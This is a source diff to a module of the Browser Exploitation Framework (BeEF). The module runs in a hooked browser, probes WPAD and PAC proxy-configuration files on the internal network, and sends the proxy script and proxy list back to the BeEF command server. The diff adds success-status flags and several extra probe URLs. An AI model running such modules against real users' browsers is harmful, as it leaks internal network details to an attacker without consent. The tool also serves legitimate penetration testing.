@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -18,7 +18,7 @@ beef.execute(function() {
     if (typeof FindProxyForURL === 'function') {
       var wpad = FindProxyForURL.toString();
       beef.debug("[Get Proxy Servers] Success: Found wpad (" + wpad.length + ' bytes)');
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=true&wpad="+wpad);
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=true&wpad="+wpad, beef.are.status_success());
     } else {
       beef.debug("[Get Proxy Servers] Error: Did not find wpad");
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=false");
@@ -38,10 +38,15 @@ beef.execute(function() {
       return;
     }
     beef.debug("[Get Proxy Servers] Found "+proxies.length+" proxies: " + proxies.join(','));
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "proxies=" + proxies.join(','));
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "proxies=" + proxies.join(','), beef.are.status_success());
   }
 
   load_script("http://wpad/wpad.dat");
+  load_script("http://wpad/wpad.pac");
+
+  load_script("http://wpad/proxy.dat");
+  load_script("http://wpad/proxy.pac");
+
   setTimeout("read_wpad()", 10000);
 
 });
